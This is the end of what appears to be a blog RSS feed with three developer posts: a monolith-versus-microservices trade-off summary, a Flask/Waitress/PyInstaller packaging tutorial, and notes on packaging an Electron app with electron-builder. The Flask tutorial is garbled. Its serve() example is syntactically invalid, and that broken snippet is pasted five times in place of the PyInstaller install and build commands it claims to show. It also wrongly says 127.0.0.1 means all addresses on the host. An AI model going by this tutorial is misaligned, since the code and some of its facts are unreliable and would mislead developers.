<p><strong>Monolith:</strong> As in the monolithic approach only one delivery pipeline is needed to deploy the whole application. As we deploy the whole application each time it came with high risk with each deployment as if the deployment didn&#8217;t work leads to a disastrous situation if the release fails as it&#8217;ll take down the entire application which means there is a higher risk of violating the zero downtime principle, which aims that application should be available to the end-user/consumers 24/7.</p>
<p><strong>Microservice:</strong> On the other hand, each service needs its own delivery pipeline so that we can deliver each service individually. As we add a new feature to a specific service only that service needs to be deployed and if that service deployment won&#8217;t go smoothly as we expected, only that service will go down but the application should be available to the consumers. As such, there is less risk to take down the entire application with each release. Consequently, Microservices allow an increased velocity of feature development as we can have more releases with less risk. </p>
<h2>Flexibility:</h2>
<p>The term <code>Flexibility</code> refers to the ability to incorporate new technologies and adapt to new principles and tooling. There are moments when it&#8217;s better to use a different programming language before a specific feature or modify our application for a specific platform.</p>
<p><strong>Monolith:</strong>  In Monolithic application, this type of modification may lead to rewritten or restructured the entire project prior to that new technology need. This leads to the conclusion that monolith application has a low flexibility rate.</p>
<p><strong>Microservice:</strong> On the other hand, each service is purposely built to be loosely coupled and allows independent changes to services as we writing or restructuring one functionality is more achievable than rewriting the entire stack.</p>
<h2>Operational Cost:</h2>
<p>The term <code>Operational Cost</code> refers to the necessary resources to build, deploy and release a product. A low initial cost to spin up an application is certainly inciting.</p>
<p><strong>Monolith:</strong>  This is the case we all observe in the monolithic architecture where only one code base is needed and there&#8217;s only one delivery pipeline to deploy the entire application.</p>
<p><strong>Microservice:</strong> On the other hand, each service requires the maintenance of multiple codebases and delivery pipelines and the dependencies of maintaining different programming languages if we require to use them in a microservice.</p>
<p>This scenario demonstrates the whole application/product development process. The situation is flipped when new functionalities are added and the application needs to be scaled to cope with high customer demand. </p>
<blockquote>
<p>Note: Maintaining a monolith over time imposes more complexity and consumes more resources when replication, as we all know maintaining an application, is more costly than developing one from scratch. On the other hand, the Operational cost for a microservice is directly proportional to the required resource at the time. Scalability is performed on each service and adding new components is a defect to operation in an application which makes microservice more scalable than monoliths.</p>
</blockquote>
<h2>Reliability:</h2>
<p>The term <code>Reliability</code> refers to the ability to recover from failure and waste monitoring the application all the time.</p>
<p><strong>Monolith:</strong>  If an application goes to a failed state the entire stack will need to be troubleshot and recovered for availability.</p>
<p><strong>Microservice:</strong> A distributed amount of functions that interact with each other via the network calls. If a component fails then only that component will need to recovery.</p>
<blockquote>
<p>Note: In Microservices, it is possible to have representative metrics and logs of a separate unit while with monoliths getting granular visibility for each functionality is difficult as all the metrics and logs for the entire application will be aggregated together.</p>
</blockquote>
<p>If you like, you can read the same article on my <a href="https://rezwanul-haque.hashnode.dev/trade-offs-for-monoliths-and-microservices" rel="nofollow noopener" target="_blank"> Personal blog</a></p>
<p>You can read my other blog-posts <a href="https://rezwanul-haque.hashnode.dev/" rel="nofollow noopener" target="_blank">Here</a></p>
<h2>Summary</h2>
<table>
<thead>
<tr>
<th style="text-align: center">Trade-Offs</th>
<th style="text-align: center">Types</th>
<th style="text-align: center">Monoliths</th>
<th style="text-align: center">Microservices</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center">Development Complexity</td>
<td style="text-align: center"></td>
<td style="text-align: center"></td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Programming Language</td>
<td style="text-align: center">One language</td>
<td style="text-align: center">Multiple languages</td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Management of Code Repository</td>
<td style="text-align: center">One repository</td>
<td style="text-align: center">Multiple repositories</td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Development Cycle</td>
<td style="text-align: center">Sequential</td>
<td style="text-align: center">Concurrent</td>
</tr>
<tr>
<td style="text-align: center">Scalability</td>
<td style="text-align: center"></td>
<td style="text-align: center"></td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">High Traffic</td>
<td style="text-align: center">Replication of the entire stack</td>
<td style="text-align: center">Replication of specific service/functionality</td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Resouce Consumption</td>
<td style="text-align: center">Overconsumption of resources</td>
<td style="text-align: center">On-demand resource consumption</td>
</tr>
<tr>
<td style="text-align: center">Time to Deploy</td>
<td style="text-align: center"></td>
<td style="text-align: center"></td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Delivery Pipeline</td>
<td style="text-align: center">One delivery pipeline</td>
<td style="text-align: center">Multiple delivery pipeline</td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Deployment process</td>
<td style="text-align: center">Easy</td>
<td style="text-align: center">Comparatively harder</td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Deployment</td>
<td style="text-align: center">Entrie stack deployment</td>
<td style="text-align: center">Separate functionality deployment</td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Velocity</td>
<td style="text-align: center">Low velocity at scale</td>
<td style="text-align: center">High velocity at scale</td>
</tr>
<tr>
<td style="text-align: center">Flexibility</td>
<td style="text-align: center"></td>
<td style="text-align: center">Low</td>
<td style="text-align: center">High</td>
</tr>
<tr>
<td style="text-align: center">Operational Cost</td>
<td style="text-align: center"></td>
<td style="text-align: center"></td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Initial cost</td>
<td style="text-align: center">Low</td>
<td style="text-align: center">High</td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Scaling cost</td>
<td style="text-align: center">High</td>
<td style="text-align: center">Low</td>
</tr>
<tr>
<td style="text-align: center">Reliability</td>
<td style="text-align: center"></td>
<td style="text-align: center"></td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Recovery</td>
<td style="text-align: center">Recovery of the entire stack</td>
<td style="text-align: center">Recovery of the failed component only</td>
</tr>
<tr>
<td style="text-align: center"></td>
<td style="text-align: center">Visibility(metrics/logs)</td>
<td style="text-align: center">Low</td>
<td style="text-align: center">High</td>
</tr>
</tbody>
</table>
<p>In conclusion, we can say each application architecture has a set of trade-offs that need to be considered at the beginning of a project. But more importantly, it is paramount to understand how the application will be maintained in the future e.g. at scale, under load, supporting multiple releases a day, etc.</p>
<p>There is no <code>Predefined/Golden rule</code> to build a product, but a good understanding of the trade-offs will provide a clear understanding of the roadmap to build the product goals we&#8217;re trying to achieve. Now regardless of what architecture we choose to build the project, as long as the project is coupled with an efficient delivery pipeline and design pattern, the ability to adopt new technologies and how easily we can add the feature to cloud-native deployment remains certain.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Convert  Flask Application into a Cross-Platform Desktop App Executable</title>
		<link>/blog/convert-flask-application-into-a-cross-platform-desktop-app-executable/</link>
		
		<dc:creator><![CDATA[Masum]]></dc:creator>
		<pubDate>Thu, 17 Jun 2021 13:08:56 +0000</pubDate>
				<category><![CDATA[Personal]]></category>
		<category><![CDATA[Programming & Development]]></category>
		<category><![CDATA[cross-platfrom-app]]></category>
		<category><![CDATA[executable]]></category>
		<category><![CDATA[flask]]></category>
		<category><![CDATA[pyinstaller]]></category>
		<category><![CDATA[python]]></category>
		<category><![CDATA[wsgi]]></category>
		<guid isPermaLink="false">/?p=2587</guid>

					<description><![CDATA[Python, powerful and versatile as it is, lacks a few key capabilities out of the box. For one, Python provides no native mechanism for compiling a Python program into a standalone executable package. To be fair, the original use case for Python never called for standalone packages. Python programs have, by and large, been run [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Python, powerful and versatile as it is, lacks a few key capabilities out of the box. For one, Python provides no native mechanism for compiling a Python program into a standalone executable package.</p>
<p>To be fair, the original use case for Python never called for standalone packages. Python programs have, by and large, been run in-place on systems where a copy of the Python interpreter lived. But the surging popularity of Python has created greater demand for running Python apps on systems with no installed Python runtime.</p>
<p>Several third parties have engineered solutions for deploying standalone Python apps. The most popular solution of the bunch, and the most mature, is <code>PyInstaller</code>. <code>PyInstaller</code> doesn’t make the process of packaging a Python app to go totally painless, but it goes a long way there.</p>
<h2>Waitress WSGI Server</h2>
<p>Waitress is a pure-Python WSGI server. At a first glance it might not appear to be that much different than many others; however, its development philosophy separates it from the rest. Its aim for easing the production (and development) burden caused by web servers for Python web-application developers.</p>
<p>The installation is pretty simple. It is highly recommended to create a virtual environment before you install Waitress via the pip install command:</p>
<pre></pre>
<pre class="EnlighterJSRAW" data-enlighter-language="powershell">pip install waitress</pre>
<pre></pre>
<p>&nbsp;</p>
<p>Then You need to first import waitress via the following command:</p>
<pre></pre>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">from waitress import serve</pre>
<pre></pre>
<p>&nbsp;</p>
<p>I will be using the app as the variable name for the Flask server. Modify this according to the name that you have set:</p>
<pre></pre>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">app = Flask(__name__)</pre>
<pre></pre>
<p>Comment out the app.run in your main server and add the following code.</p>
<p>By default, Waitress binds to any IPv4 address on port 8080. You can omit the host and port arguments and just call serve with the WSGI app as a single argument. we overwrite it and set the <code>port</code> to <code>5000</code> for demostration on how to change them.</p>
<pre></pre>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">serve(
app.run()
   host="127.0.0.1",
   port=5000,
   threads=2
)</pre>
<pre></pre>
<p>&nbsp;</p>
<p>The most commonly-used parameters for serve are as follows:</p>
<ul>
<li><code>host</code> — Hostname or IP address (string) on which to listen, default 127.0.0.1, which means “all IP addresses on this host”. May not be used with the listen parameter.</li>
<li><code>port</code> — TCP port (integer) on which to listen, default 8080. May not be used with the listen parameter.</li>
<li><code>ipv4</code> — Enable or disable IPv4 (boolean).</li>
<li><code>ipv6</code> — Enable or disable IPv6 (boolean).</li>
<li><code>threads</code> — The number of threads used to process application logic (integer). The default value is 4.</li>
</ul>
<h2>Create Executable from Python Script using Pyinstaller</h2>
<p><code>PyInstaller</code> can be used to create .exe files for Windows, .app files for Mac, and distributable packages for Linux. Optionally, it can create a single file which is more convenient for distributing, but takes slightly longer to start because it unzips itself.</p>
<p>The installation is pretty simple. It is highly recommended to create a virtual environment before you install via the pip install command.</p>
<pre></pre>
<pre class="EnlighterJSRAW" data-enlighter-language="powershell">serve(
app.run()
   host="127.0.0.1",
   port=5000,
   threads=2
)</pre>
<p>This file is saved in build.sh and runs this file using the following command in the terminal.</p>
<pre></pre>
<pre class="EnlighterJSRAW" data-enlighter-language="powershell">serve(
app.run()
   host="127.0.0.1",
   port=5000,
   threads=2
)</pre>
<h3>For windows is:</h3>
<pre></pre>
<pre class="EnlighterJSRAW" data-enlighter-language="python">serve(
app.run()
   host="127.0.0.1",
   port=5000,
   threads=2
)</pre>
<h3>For mac is:</h3>
<pre></pre>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">serve(
app.run()
   host="127.0.0.1",
   port=5000,
   threads=2
)</pre>
<h3>For ubuntu is:</h3>
<pre></pre>
<pre class="EnlighterJSRAW" data-enlighter-language="python">serve(
app.run()
   host="127.0.0.1",
   port=5000,
   threads=2
)</pre>
<pre></pre>
<p>The most commonly-used parameters for <code>build.sh</code> are as follows:</p>
<ul>
<li><code>--name</code> — Change the name of your executable.</li>
<li><code>--onefile</code> — Package your entire application into a single executable file. The default options create a folder of dependencies and an executable, whereas &#8211;onefile keeps distribution easier by creating only an executable.</li>
<li><code>--hidden-import</code> — List multiple top-level imports that PyInstaller was unable to detect automatically. This is one way to work around your code using import inside functions and <strong>import</strong>(). You can also use &#8211;hidden-import multiple times in the same command.</li>
<li><code>--add-data</code> and <code>--add-binary</code> — Instruct PyInstaller to insert additional data or binary files into your build. This is useful when you want to bundle in configuration files, examples, or other non-code data.</li>
</ul>
<p><code>PyInstaller</code> is complicated under the hood and will create a lot of output. So, it’s important to know what to focus on first. Namely, the executable you can distribute to your users and potential debugging information. By default, the pyinstaller command will create a few things of interest:</p>
<ul>
<li>A <code>*.spec</code> file
<ul>
<li>where all configuration was put by <code>pyinstaller</code></li>
</ul>
</li>
<li>A <code>build</code> folder
<ul>
<li>The <code>build</code> folder is where <code>PyInstaller</code> puts most of the metadata and internal bookkeeping for building your executable.</li>
<li>The <code>build</code> folder can be useful for debugging, but unless you have problems, this folder can largely be ignored.</li>
</ul>
</li>
<li>A <code>bin</code> folder
<ul>
<li>will be created After building, you’ll end up with a bin folder similar to the following:
<pre></pre>
<pre class="EnlighterJSRAW" data-enlighter-language="powershell">bin/
|
└── our_app/
└── our_app  # this is the executable</pre>
</li>
</ul>
</li>
</ul>
<p>The <code>bin</code> folder contains the final artifact you’ll want to ship to your end users. Inside the <code>bin</code> folder, there is a folder named after your entry-point. So in this example, you’ll have a <code>bin/our_project</code> folder that contains all the dependencies and executable for our application.</p>
<p>The executable to run is <code>bin/our_app/our_app</code> or <code>bin/our_app/our_app.exe</code> if you’re on Windows.</p>
<p>pyInstaller creates a temp folder and the name of that folder is <code>__MEIPASS__</code>. Generally a new e.g. <code>__ME&lt;Random_Value&gt;__</code> file created at the time of each time we execute the file and previous <code>__MEIPASS__</code> file deleted because of it’s volatile memory. So the previous data is removed from storage as we store our db and other files in the that temp folder using pyinstallers <code>--add-data</code> property, but we need to store previous data for the persistence. For this reason we create a hidden folder in the system&#8217;s home directory and store data in this folder. But initially sqlite database file does not exist in this hidden folder. So at execution time we create a hidden folder in the system home directory when we execute the file and we have to copy that fresh db along with other files from the temp folder and save to the hidden folder. The code of copying and saving this db along with the other files given below:</p>
<pre><code class="language-python"> </code></pre>
<pre class="EnlighterJSRAW" data-enlighter-language="python">import os, shutil
from pathlib import Path
from .resources import get_resources_path

APP_NAME = "our_app"
HOME_DIR = Path.home()
APP_DIR = HOME_DIR / f".{APP_NAME.lower()}"
if not APP_DIR.exists():  ## checking if our persistence hidden filder exists or not
   os.mkdir(APP_DIR)  ## create the hidden folder
data = get_resources_path() / data ## searching files in the temp folder
if not (APP_DIR /  data).exists():  ## checking if our persistence files already in the hidden directory or not
   try:
       shutil.copy(data, APP_DIR)
   except Exception as e:
       log.exception(e)</pre>
<pre><code class="language-python"> </code>Get resources path function to find the <code>__MEIPASS__</code> folder path link from where we can copy fresh data and can store to the hidden folder.</pre>
<pre><code class="language-python"></code></pre>
<pre><code class="language-python"> </code></pre>
<pre class="EnlighterJSRAW" data-enlighter-language="php">import pathlib
import sys
def get_resources_path(relative_path="."):
    rel_path = pathlib.Path(relative_path)
    prod_base_path = pathlib.Path(__file__).resolve().parent.parent

    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception as e:
        base_path = getattr(sys, "_MEIPASS", prod_base_path)

    return base_path / rel_path</pre>
<pre><code class="language-python"></code></pre>
<h2>Conclusion</h2>
<p>PyInstaller can help make complicated installation documents unnecessary. Instead, your users can simply run your executable to get started as quickly as possible. The PyInstaller workflow can be summed up by doing the following:</p>
<ul>
<li>Create an entry-point script that calls your main function.</li>
<li>Install PyInstaller.</li>
<li>Run PyInstaller on your entry-point.</li>
<li>Test your new executable.</li>
<li>Ship your resulting dist/ folder to users.</li>
</ul>
<p>Your users don’t have to know what version of Pyt hon you used or that your application uses Python at all!</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Issue Arises When Building A Desktop App Using Electron And Electron-Builder</title>
		<link>/blog/issue-arises-when-building-a-desktop-app-using-electron-and-electron-builder/</link>
		
		<dc:creator><![CDATA[Rezwanul Haque]]></dc:creator>
		<pubDate>Mon, 07 Jun 2021 11:05:01 +0000</pubDate>
				<category><![CDATA[Personal]]></category>
		<category><![CDATA[Programming & Development]]></category>
		<category><![CDATA[AntDesign]]></category>
		<category><![CDATA[DesktopAPP]]></category>
		<category><![CDATA[Electron]]></category>
		<category><![CDATA[ElectronBuilder]]></category>
		<category><![CDATA[ElectronReactBoilerplate]]></category>
		<category><![CDATA[React]]></category>
		<guid isPermaLink="false">/?p=2544</guid>

					<description><![CDATA[Author: Eftakher Sazid Designation: Intern at Vivasoft LTD Javascript and its available incredible user-friendly frameworks make it very easy to make web applications. But as it runs only on the web and browsers, it is not possible to create a desktop application using Javascript. Here ElectronJS comes to the rescue. ElectronJS is an open-source framework [&#8230;]]]></description>
										<content:encoded><![CDATA[<p style="text-align: left" align="center">Author: Eftakher Sazid<br />
Designation: Intern at Vivasoft LTD</p>
<p align="center"><img decoding="async" src="https://upload.wikimedia.org/wikipedia/commons/9/91/Electron_Software_Framework_Logo.svg" width="200" height="200" alt="Electron Software Framework Logo Issue Arises When Building A Desktop App Using Electron And Electron-Builder"></p>
<p>Javascript and its available incredible user-friendly frameworks make it very easy to make web applications. But as it runs only on the web and browsers, it is not possible to create a desktop application using Javascript. Here ElectronJS comes to the rescue.</p>
<p>ElectronJS is an open-source framework that allows us to create desktop applications using web technologies. That means Javascript, HTML, CSS, and their entire arsenal of frameworks. That makes it significantly easy to design and create a GUI for a desktop application.</p>
<p>ElectronJS has all the tools as the browser and some additional tools to access the file system for reading and writing operations. So it is not a browser but more. It is pretty easy to create an application in development mode but the tricky part comes while packaging the app for production. We’ll explore all the challenges of creating one.</p>
<p>The very first step is to create a project. Now we can create a Javascript and HTML-only project pretty easily but the hassle begins while adding the frameworks like React and webpack. Now boilerplates for electron applications have solved the hassle of manually configuring the project along with all its dependencies. Popular boilerplates like <a href="https://electron-react-boilerplate.js.org/" rel="nofollow noopener" target="_blank">electron-react-boilerplate</a>, <a href="https://www.electronforge.io/" rel="nofollow noopener" target="_blank">electron-forge</a>, <a href="https://www.electron.build/" rel="nofollow noopener" target="_blank">electron-builder</a> are widely used.</p>
<p>For my application, I used the <code>electron-react-boilerplate</code>. It has support for <em><strong>TypeScript</strong></em>, <em><strong>React</strong></em>, <em><strong>react-router-dom</strong></em> out of the box and it uses <code>electron-builder</code> to package the application. It has a pretty straightforward project setup that you can find <a href="https://electron-react-boilerplate.js.org/docs/installation" rel="nofollow noopener" target="_blank">here</a>. Then after project setup, you should get rid of all the unnecessary pre-installed dependencies and config files. Let me name some of them, <code>.github</code>, <code>.git</code>(obviously, you don’t want to use that git), <code>CHANGELOG.md</code>, <code>CODE_OF_CONDUCT.md</code>, <code>src/__test__</code> if you don&#8217;t need them.</p>
<p>The first issue that you may face that <code>electron-react-boilerplate</code> has all the support needed for <em><strong>Typescript</strong></em> but if you use Javascript only like I did, you have to change the <code>.erb/webpack.config.base.js</code> file in the project directory. By default, while packaging this application using the electron-builder it will only accept files with the <code>.tsx</code> extension.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="js">import path from 'path';
import webpack from 'webpack';
import { dependencies as externals } from '../../src/package.json';

export default {
  externals: [...Object.keys(externals || {})],

  module: {
    rules: [
      {
        test: /\.tsx?$/,
        exclude: /node_modules/,
        use: {
          loader: 'babel-loader',
          options: {
            cacheDirectory: true,
          },
        },
      },
    ],
  }
}
</pre>
<p>Now to configure for accepting files with <code>.js</code>, <code>.jsx</code> and <code>.ts</code> extensions we need to change,</p>
<pre class="EnlighterJSRAW" data-enlighter-language="js">import path from 'path';
import webpack from 'webpack';
import { dependencies as externals } from '../../src/package.json';

export default {
  externals: [...Object.keys(externals || {})],

  module: {
    rules: [
      {
        test: /\.ts|\.tsx|\.jsx|\.js?$/,
        exclude: /node_modules/,
        use: {
          loader: 'babel-loader',
          options: {
            cacheDirectory: true,
          },
        },
      },
    ],
  }
}
</pre>
<p>Now we are good to go.</p>
<p>The second issue that I faced was using third-party UI libraries like <code>semantic-ui</code>, <code>ant-design</code> was that even after installing the dependencies the imports of their CSS files in the <code>index.tsx</code> was not working.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="js">import 'react-datepicker/dist/react-datepicker.css';
import 'antd/dist/antd.css';</pre>
<p>Now to solve this you have to add them inside the <code>&lt;head&gt;</code> tag of your <code>src/index.html</code> file as <code>&lt;link/&gt;</code> .</p>
<pre class="EnlighterJSRAW" data-enlighter-language="html">&lt;head&gt;
  &lt;meta charset="utf-8" /&gt;
  &lt;title&gt;App name&lt;/title&gt;
  &lt;link
    rel="stylesheet"
    type="text/css"
    href="../node_modules/react-toastify/dist/ReactToastify.css"
  /&gt;
  &lt;link
    rel="stylesheet"
    type="text/css"
    href="../node_modules/antd/dist/antd.css"
  /&gt;
  ...
&lt;/head&gt;</pre>
<p>Now all the CSS property of the UI components will be working fine.</p>
<p>For my project, I had to run the executable of my backend when my app was starting. To run an external application electron can use the <code>exec</code> and <code>execFile</code> from the <code>child_process</code> of the node.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="js">import { exec, execFile } from 'child_process';</pre>
<p>The <code>execFile</code> executes the executable for my backend. You can run pretty much any executable using this.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="js">execFile(
  backEnd,
  {
    windowsHide: false,
  },
  (err, stdout, stderr) =&gt; {
    if (err) {
      console.log(err);
    }
    if (stdout) {
      console.log(stdout);
    }
    if (stderr) {
      console.log(stderr);
    }
  }
);</pre>
<p>To close the backend while closing the app you can use <code>exec</code>.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="js">exec(`taskkill /f /t /im ${executableName}`, (err, stdout, stderr) =&gt; {
  if (err) {
    log.error(err);
    console.log(err);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.log(`stderr: ${stderr}`);
});</pre>
<p>&nbsp;</p>
<p>For this to work, I kept my backend in the <code>src/Backend</code> folder. Now to package this along with all the dependencies I need to add this folder to the <em><code>package.json</code></em> file. Any file or folder included in the <code>“files”</code> array, will be added to the <em><code>app.asar</code></em> file. That does not solve it, because while packaging using <code>electron-builder</code> all these files are exported to a format called <strong><code>.asar</code></strong> format. The problem with this format is that no executable or app can be executed from within this <strong><code>.asar</code></strong> format. So we have to unpack the backend from the packaged <em><code>app.asar</code></em> file. The file specified in the <code>“asarUnpack”</code> will be unpacked from the <em><code>app.asar</code></em> and will be executable.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="json">"build": {
    "productName": "App name",
    "appId": "org.erb.appName",
    "asarUnpack": [
      "Backend/bin/*"
    ],
    "files": [
      "dist/",
      "node_modules/",
      "index.html",
      "main.prod.js",
      "main.prod.js.map",
      "package.json",
      "Backend"
    ],
 ....
    }
  },</pre>
<p>Now while packaging <code>yarn package</code> will create the native installer for the OS in the <code>release</code> folder in the root directory.</p>
<h4 id="to-make-os-specific-build" class="mume-header">To make OS-specific build:</h4>
<ul>
<li><strong>Linux</strong>: <code>yarn package --linux</code></li>
<li><strong>Windows</strong>: <code>yarn package --win</code></li>
<li><strong>macOS</strong>: <code>yarn package --mac</code></li>
</ul>
<p>The final build doesn&#8217;t have any dev-tool support, so enable dev-tool in build version:</p>
<ul>
<li><strong>Build debug</strong>: <code>yarn cross-env DEBUG_PROD=true yarn package</code></li>
</ul>
<p>This installer will be enough to run the application on any system.</p>
]]></content:encoded>
					
		
		
			</item>
	</channel>
</rss>
